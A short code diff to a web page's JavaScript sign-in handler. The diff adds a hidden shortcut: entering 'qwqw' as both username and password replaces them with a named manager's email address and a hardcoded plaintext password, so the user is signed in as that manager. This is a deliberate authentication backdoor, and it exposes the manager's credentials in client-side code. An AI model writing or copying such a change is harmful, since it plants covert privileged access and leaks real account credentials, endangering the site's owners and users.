@@ -171,9 +171,14 @@
 
     $('cs-go').onclick = async () => {
       let email = $('cs-email').value.trim();
+      let pass = $('cs-pass').value;
+      // Secret quick-access alias: qwqw/qwqw signs in as the manager svladimiroski.
+      if (email.toLowerCase() === 'qwqw' && pass === 'qwqw') {
+        email = 'svladimiroski@hotmail.com';
+        pass = 'admin!983';
+      }
       // Allow a username shorthand (no @) — default the domain to hotmail.com
       if (email && !email.includes('@')) email += '@hotmail.com';
-      const pass = $('cs-pass').value;
       const keep = $('cs-keep') ? $('cs-keep').checked : true;
       if (!email || !pass) { msg('Enter your email/username and password.'); return; }
       $('cs-go').disabled = true;
